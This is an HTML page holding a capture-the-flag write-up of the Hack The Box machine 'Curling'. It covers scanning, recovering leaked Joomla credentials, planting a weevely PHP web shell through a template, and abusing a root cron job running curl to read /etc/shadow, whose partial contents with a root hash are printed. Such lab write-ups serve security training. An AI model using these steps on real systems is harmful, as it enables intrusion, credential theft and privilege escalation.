@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Curling</strong></h1>
+        <em>Released: 27 Oct 2018 / Pwned: March 30th '19 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        This box was fun and farily straight forward. This was the first time I'd encoutered joomla, and learnt some new things about curl too.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.150</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>htbCurling#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>initial.txt&nbsp;10.10.10.150<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-03-23&nbsp;18<span style="color:#ff9d00;font-weight:700">:</span>48&nbsp;GMT<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">10</span>.10.10.150<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.039s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;998&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                22/tcp&nbsp;open&nbsp;&nbsp;tcpwrapped<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9&nbsp;(ED25519)<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.29&nbsp;((Ubuntu))<br>
+                |_http-generator:&nbsp;Joomla!&nbsp;-&nbsp;Open&nbsp;Source&nbsp;Content&nbsp;Management<br>
+                |_http-server-header:&nbsp;Apache/2.4.29&nbsp;(Ubuntu)<br>
+                |_http-title:&nbsp;Home<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(If&nbsp;you&nbsp;know&nbsp;what&nbsp;OS&nbsp;is&nbsp;running&nbsp;on&nbsp;it,&nbsp;see&nbsp;https://nmap.org/submit/&nbsp;).<br>
+                ...<br>
+            </div>
+        </div><br>
+        <br>
+        ssh on port 22 and a webserver on port 80 are running.<br>
+        <br>
+        I ran a full port scan to check for anything else:<br>
+        <code>nmap -p- -sV -sS -T4 -oN nmap/full.txt 10.10.10.150</code><br>
+        <br>
+        Nothing new :/<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) Joomla login</strong></h2><br>
+        There's nothing we can do with ssh at the moment, so have a look at the web server.<br>
+        <br>
+        <a href="http://10.10.10.150/">http://10.10.10.150/</a><br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        I checked /robots.txt, which didn't exist.<br>
+        Right click home page&gt; view source - scroll to the bottom and you'll find<br>
+        <code>&lt;!-- secret.txt --&gt;</code><br>
+        Navigating to http://10.10.10.150/secret.txt gives:<br>
+        <code>Q3VybGluZzIwMTgh</code><br>
+        <br>
+        This looks like base64. One way to check is if the string is divisible by 4 e.g. <code>Q3Vy bGlu ZzIw MTgh</code><br>
+        If you base64 decode the string, you get what looks like a password:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>htbCurling#&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;Q3VybGluZzIwMTgh&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;base64&nbsp;-d<br>
+                Curling2018<span style="color:#ff9d00;font-weight:700">!</span>
+            </div>
+        </div><br>
+        <br>
+        My goal at this point became to find a username, considering we have what seems to be a password.<br>
+        The homepage looked like a blog, so I returned to the homepage to look at the authors of the blog articles. Luckily this wasn't too hard, you can even find a username on the homepage. ‘My first post of curling in 2018!’ is sigend <code>- Floris</code>.<br>
+        <br>
+        Joomla's administrator login portal is located at <a href="http://10.10.10.150/administrator">http://10.10.10.150/administrator</a><br>
+        Log in using <code>floris / Curling2018!</code><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) Joomla to Shell</strong></h2><br>
+        Apparently there are multiple ways to get a shell using the Joomla adminstrator panel.<br>
+        First I tried to upload php shell by modifying the allowed file types and using the media upload option, but this didn't work. Next I messed with the templates.<br>
+        <br>
+        1. Go to <code>Extensions - &gt; Templates - &gt; Templates</code>. I picked beeze3, but you could use either.<br>
+        2. Create a new file. From the drop down menu pick php, name it whatever you like, and in the contents of the page paste a php shell<br>
+        <br>
+        2a) I generated a shell using weevely.
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>htbCurling#&nbsp;weevely&nbsp;generate&nbsp;magic&nbsp;password<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Generated&nbsp;<span style="color:#3ad900;font-weight:400">'magic'</span>&nbsp;with&nbsp;password&nbsp;<span style="color:#3ad900;font-weight:400">'password'</span>&nbsp;of&nbsp;762&nbsp;byte&nbsp;size.
+            </div>
+        </div><br>
+        <br>
+        2b) And then <code>cat</code> the generated shell and copy/paste it into the content section of the new file template.
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>htbCurling#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;magic
+            </div>
+        </div><br>
+        <br>
+        3. Check the new file is there by navigating to the shell, you should just see a blank page:<br>
+        <a href="http://10.10.10.150/templates/beeze3/magic">http://10.10.10.150/templates/beeze3/magic</a><br>
+        <br>
+        4. Access your shell using weevely<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>htbCurling#&nbsp;weevely&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.150<span style="color:#ff9d00;font-weight:700">/</span>templates<span style="color:#ff9d00;font-weight:700">/</span>beeze3<span style="color:#ff9d00;font-weight:700">/</span>magic&nbsp;password
+            </div>
+        </div><br>
+        <br>
+        You should have a shell!<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) www-data to floris</strong></h2><br>
+        First thing's first, check /home<br>
+        <code>ls -alh /home</code><br>
+        <br>
+        Have a look at <code>/home/floris</code><br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>floris<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;7&nbsp;floris&nbsp;floris&nbsp;4096&nbsp;Feb&nbsp;&nbsp;4&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>12&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;3&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;4096&nbsp;May&nbsp;22&nbsp;&nbsp;2018&nbsp;..<br>
+                lrwxrwxrwx&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;9&nbsp;May&nbsp;22&nbsp;&nbsp;2018&nbsp;.bash_history&nbsp;-&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;floris&nbsp;floris&nbsp;&nbsp;220&nbsp;Apr&nbsp;&nbsp;4&nbsp;&nbsp;2018&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;floris&nbsp;floris&nbsp;3771&nbsp;Apr&nbsp;&nbsp;4&nbsp;&nbsp;2018&nbsp;.bashrc<br>
+                drwx------&nbsp;2&nbsp;floris&nbsp;floris&nbsp;4096&nbsp;May&nbsp;22&nbsp;&nbsp;2018&nbsp;.cache<br>
+                drwx------&nbsp;3&nbsp;floris&nbsp;floris&nbsp;4096&nbsp;Feb&nbsp;&nbsp;4&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>46&nbsp;.config<br>
+                drwx------&nbsp;3&nbsp;floris&nbsp;floris&nbsp;4096&nbsp;May&nbsp;22&nbsp;&nbsp;2018&nbsp;.gnupg<br>
+                drwxrwxr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;3&nbsp;floris&nbsp;floris&nbsp;4096&nbsp;May&nbsp;22&nbsp;&nbsp;2018&nbsp;.local<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;floris&nbsp;floris&nbsp;&nbsp;807&nbsp;Apr&nbsp;&nbsp;4&nbsp;&nbsp;2018&nbsp;.profile<br>
+                drwxr<span style="color:#ffdd00;font-weight:400">-x</span>---&nbsp;2&nbsp;root&nbsp;&nbsp;&nbsp;floris&nbsp;4096&nbsp;May&nbsp;22&nbsp;&nbsp;2018&nbsp;admin-area<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;floris&nbsp;floris&nbsp;1076&nbsp;May&nbsp;22&nbsp;&nbsp;2018&nbsp;password_backup<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>-----&nbsp;1&nbsp;floris&nbsp;floris&nbsp;&nbsp;&nbsp;33&nbsp;May&nbsp;22&nbsp;&nbsp;2018&nbsp;user.txt
+            </div>
+        </div><br>
+        <br>
+        <code>password_backup</code> didn't stand out to me at first for some reason, but this is what you should be looking at.<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>floris<span style="color:#ff9d00;font-weight:700">/</span>password_backup<br>
+                00000000<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;425a&nbsp;6839&nbsp;3141&nbsp;5926&nbsp;5359&nbsp;819b&nbsp;bb48&nbsp;0000&nbsp;&nbsp;BZh91AY<span style="color:#ff9d00;font-weight:700">&amp;</span>SY...H..<br>
+                00000010<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;17ff&nbsp;fffc&nbsp;41cf&nbsp;05f9&nbsp;5029&nbsp;6176&nbsp;61cc&nbsp;3a34&nbsp;&nbsp;....A...P)ava.<span style="color:#ff9d00;font-weight:700">:</span>4<br>
+                00000020<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;4edc&nbsp;cccc&nbsp;6e11&nbsp;5400&nbsp;23ab&nbsp;4025&nbsp;f802&nbsp;1960&nbsp;&nbsp;N...n.T.#.@%...<span style="color:#333333;font-weight:400">`<br>
+                00000030:&nbsp;2018&nbsp;0ca0&nbsp;0092&nbsp;1c7a&nbsp;8340&nbsp;0000&nbsp;0000&nbsp;0000&nbsp;&nbsp;&nbsp;......z.@......<br>
+                00000040:&nbsp;0680&nbsp;6988&nbsp;3468&nbsp;6469&nbsp;89a6&nbsp;d439&nbsp;ea68&nbsp;c800&nbsp;&nbsp;..i.4hdi...9.h..<br>
+                00000050:&nbsp;000f&nbsp;51a0&nbsp;0064&nbsp;681a&nbsp;069e&nbsp;a190&nbsp;0000&nbsp;0034&nbsp;&nbsp;..Q..dh........4</span><br>
+                <span style="color:#333333;font-weight:400">00000060:&nbsp;6900&nbsp;0781&nbsp;3501&nbsp;6e18&nbsp;c2d7&nbsp;8c98&nbsp;874a&nbsp;13a0&nbsp;&nbsp;i...5.n......J..</span><br>
+                <span style="color:#333333;font-weight:400">00000070:&nbsp;0868&nbsp;ae19&nbsp;c02a&nbsp;b0c1&nbsp;7d79&nbsp;2ec2&nbsp;3c7e&nbsp;9d78&nbsp;&nbsp;.h...*..}y..&lt;~.x<br>
+                00000080:&nbsp;f53e&nbsp;0809&nbsp;f073&nbsp;5654&nbsp;c27a&nbsp;4886&nbsp;dfa2&nbsp;e931&nbsp;&nbsp;.&gt;...sVT.zH....1<br>
+                00000090:&nbsp;c856&nbsp;921b&nbsp;1221&nbsp;3385&nbsp;6046&nbsp;a2dd&nbsp;c173&nbsp;0d22&nbsp;&nbsp;.V...!3.`</span>F...s.<span style="color:#3ad900;font-weight:400">"<br>
+                000000a0:&nbsp;b996&nbsp;6ed4&nbsp;0cdb&nbsp;8737&nbsp;6a3a&nbsp;58ea&nbsp;6411&nbsp;5290&nbsp;&nbsp;..n....7j:X.d.R.<br>
+                000000b0:&nbsp;ad6b&nbsp;b12f&nbsp;0813&nbsp;8120&nbsp;8205&nbsp;a5f5&nbsp;2970&nbsp;c503&nbsp;&nbsp;.k./...&nbsp;....)p..<br>
+                000000c0:&nbsp;37db&nbsp;ab3b&nbsp;e000&nbsp;ef85&nbsp;f439&nbsp;a414&nbsp;8850&nbsp;1843&nbsp;&nbsp;7..;.....9...P.C<br>
+                000000d0:&nbsp;8259&nbsp;be50&nbsp;0986&nbsp;1e48&nbsp;42d5&nbsp;13ea&nbsp;1c2a&nbsp;098c&nbsp;&nbsp;.Y.P...HB....*..<br>
+                000000e0:&nbsp;8a47&nbsp;ab1d&nbsp;20a7&nbsp;5540&nbsp;72ff&nbsp;1772&nbsp;4538&nbsp;5090&nbsp;&nbsp;.G..&nbsp;.U@r..rE8P.<br>
+                000000f0:&nbsp;819b&nbsp;bb48&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...H</span>
+            </div>
+        </div><br>
+        <br>
+        It's a hexdump of a file. With a header of BZ, it probably means it's a bizip file.<br>
+        I copy/pasted the contents of this file and made a copy of it on my kali machine.<br>
+        <br>
+        Convert from a hexdump back into a file:<br>
+        <code>xxd -r password_backup &gt; hithere</code><br>
+        <br>
+        And now for cat and mouse:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>htbCurling#&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;hithere<br>
+                hithere<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">bzip2</span>&nbsp;compressed&nbsp;data,&nbsp;block&nbsp;size&nbsp;=&nbsp;900k<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>htbCurling#&nbsp;<span style="color:#ff9d00;font-weight:700">bzip2</span>&nbsp;-d&nbsp;hithere<br>
+                <span style="color:#ff9d00;font-weight:700">bzip2:</span>&nbsp;Cant&nbsp;guess&nbsp;original&nbsp;name&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">hithere</span>&nbsp;--&nbsp;using&nbsp;hithere.out<br>
+                root@kali:~/htbCurling#&nbsp;file&nbsp;hithere.out<br>
+                hithere.out:&nbsp;gzip&nbsp;compressed&nbsp;data,&nbsp;was&nbsp;"password",&nbsp;last&nbsp;modified:&nbsp;Tue&nbsp;May&nbsp;22&nbsp;19:16:20&nbsp;2018,&nbsp;from&nbsp;Unix,&nbsp;original&nbsp;size&nbsp;141<br>
+                root@kali:~/htbCurling#&nbsp;zcat&nbsp;hithere.out&nbsp;&gt;&nbsp;hithere2<br>
+                root@kali:~/htbCurling#&nbsp;file&nbsp;hithere2<br>
+                hithere2:&nbsp;bzip2&nbsp;compressed&nbsp;data,&nbsp;block&nbsp;size&nbsp;=&nbsp;900k<br>
+                root@kali:~/htbCurling#&nbsp;bzip2&nbsp;-d&nbsp;hithere2<br>
+                bzip2:&nbsp;Can't&nbsp;guess&nbsp;original&nbsp;name&nbsp;for&nbsp;hithere2&nbsp;--&nbsp;using&nbsp;hithere2.out<br>
+                root@kali:~/htbCurling#&nbsp;file&nbsp;hithere2.out<br>
+                hithere2.out:&nbsp;POSIX&nbsp;tar&nbsp;archive&nbsp;(GNU)<br>
+                root@kali:~/htbCurling#&nbsp;tar&nbsp;-xvf&nbsp;hithere2.out<br>
+                password.txt<br>
+                root@kali:~/htbCurling#&nbsp;cat&nbsp;password.txt<br>
+                5d&lt;wdCbdZu)|hChXll
+            </div>
+        </div><br>
+        <br>
+        Floris' password! Log in via ssh:<br>
+        <code>ssh floris@10.10.10.150<br>
+        5d&lt;wdCbdZu)|hChXll</code><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) floris to root</strong></h2><br>
+        Get the user flag: <code>cat /home/floris/user.txt</code><br>
+        Now we're user floris, we can look at all the things in /home/floris that we didn't have access to before as www-data. <code>admin-area</code> looks interesting...<br>
+            <div class="codebox">
+                floris@curling<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>admin-area$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;input<br>
+                url&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"http://127.0.0.1"</span><br>
+                floris@curling<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>admin-area$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;report
+            </div>
+        </div><code><br></code>No idea what <code>input</code> does.<code><br>
+        report</code> gives us the source code of the homepage @ <a href="http://10.10.10.150/">http://10.10.10.150/</a><br>
+        <br>
+        I didn't know what to do with this for the time being, so I ran some usual commands.<br>
+        <code>ps aux | grep root</code> gave me the piece of information I needed.<br>
+            <div class="codebox">
+                root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3643&nbsp;&nbsp;0.0&nbsp;&nbsp;0.0&nbsp;&nbsp;&nbsp;4628&nbsp;&nbsp;&nbsp;772&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ss&nbsp;&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>52&nbsp;&nbsp;&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span>&nbsp;-c&nbsp;curl&nbsp;-K&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>floris<span style="color:#ff9d00;font-weight:700">/</span>admin-area<span style="color:#ff9d00;font-weight:700">/</span>input&nbsp;-o&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>floris<span style="color:#ff9d00;font-weight:700">/</span>admin-area<span style="color:#ff9d00;font-weight:700">/</span>report
+            </div>
+        </div><br>
+        <br>
+        Now we see what that input file is being used for:<br>
+        <code>curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report</code><br>
+        <br>
+        -K specifies a config file for curl, so you put all the commands you want into this config file instead of running it on the command line<br>
+        <br>
+        Based on the contents of <code>/home/floris/admin-area/input</code>, the actual curl command that's being executed looks like this:<br>
+        <code>curl url = "http://127.0.0.1" -o /home/floris/admin-area/report</code><br>
+        <br>
+        I didn't know this prior, but with curl you can access files.<br>
+        I learnt this by reading here: <a href="https://gtfobins.github.io/gtfobins/curl/">https://gtfobins.github.io/gtfobins/curl/</a><br>
+        <br>
+        This command is also being run as root, which means that we should be able to read anything on the system.<br>
+        <br>
+        Let's test:<br>
+        1. Modify the <code>input</code> file<br>
+        <br>
+        1a) <code>floris@curling:~/admin-area$ nano input</code><br>
+        1b) In nano write: <code>url = "file:///etc/shadow"</code><br>
+        1c) CTRL+O to save the file<br>
+        <br>
+        2. Watch the <code>report</code> file for changes (will check every 5 seconds)<br>
+        <code>floris@curling:~/admin-area$ watch -n 5 cat report</code><br>
+        <br>
+        Nice! We now have <code>/etc/shadow</code>.<br>
+        <br>
+        Curl can ‘upload’, which in a file context means we can write files to the system.<br>
+        And, in this circumstance, we can do it as root.<br>
+        <br>
+        You now have to come up with a way to change your (floris') permissions on the system by modifying a file.<br>
+        You can't execute anything with curl, only write stuff.<br>
+        <br>
+        The 2 options I could think of was modifying /etc/shadow and /etc/sudoers, both of these we could modify to let us get a root shell.<br>
+        <br>
+        I went with <code>/etc/shadow</code> because it's not something I've tried before, and because I already had the the contents of it.<br>
+        <br>
+        Here's the original /etc/shadow that's found on Curling:<br>
+            <div class="codebox">
+                root<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#7f0044;font-weight:400">$6$RIgrVboA$HDaB29xvtkw6U</span><span style="color:#ff9d00;font-weight:700">/</span>Mzq4qOHH2KHB1kIR0ezFyjL75DszasVFwznrsWcc1Tu5E2K4FA7<span style="color:#ff9d00;font-weight:700">/</span>Nv8oje0c.bljjnn6FMF1<span style="color:#ff9d00;font-weight:700">:</span>17673<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                daemon<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                bin<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                sys<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                <span style="color:#ff9d00;font-weight:700">sync:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                games<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                <span style="color:#ff9d00;font-weight:700">man:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                <span style="color:#ff9d00;font-weight:700">lp:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                mail<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                news<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                uucp<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                proxy<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                www-data<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                backup<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                list<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                irc<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                gnats<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                nobody<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                systemd-network<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                systemd-resolve<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                syslog<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                messagebus<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
